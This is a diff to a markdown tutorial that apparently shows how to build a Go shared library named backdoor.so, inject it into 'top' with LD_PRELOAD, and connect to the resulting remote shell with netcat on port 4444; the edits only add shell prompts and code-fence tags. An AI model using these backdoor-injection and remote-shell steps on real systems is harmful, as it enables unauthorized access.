@@ -71,7 +71,7 @@ We can dynamically link to the `.so` [shared object file][] we have
 created using the `LD_PRELOAD` environment variable, for example:
 
 ```sh
-LD_PRELOAD=./library_name.so top
+$ LD_PRELOAD=./library_name.so top
 ```
 
 [new execution modes]: https://docs.google.com/document/d/1nr-TQHw_er6GOQRsF6T43GGhFDelrAP0NqSS_00RgZQ/edit?pli=1#heading=h.44n2lm20ate5
@@ -307,8 +307,8 @@ func strrchr(s *C.char, c C.int) *C.char {
 To compile the shared C library, use `go build` with the `-buildmode`
 flag:
 
-```
-go build -buildmode=c-shared -o backdoor.so main.go
+```sh
+$ go build -buildmode=c-shared -o backdoor.so main.go
 ```
 
 If we set the `LD_PRELOAD` environment variable to use our shared
@@ -316,12 +316,12 @@ library and invoke `top` under Linux, we can then connect to the remote
 shell using `netcat` or `telnet`:
 
 ```sh
-LD_PRELOAD=./backdoor.so top
+$ LD_PRELOAD=./backdoor.so top
 ```
 
 ```sh
 # In another terminal
-nc localhost 4444
+$ nc localhost 4444
 [...type your commands here...]
 ```
 
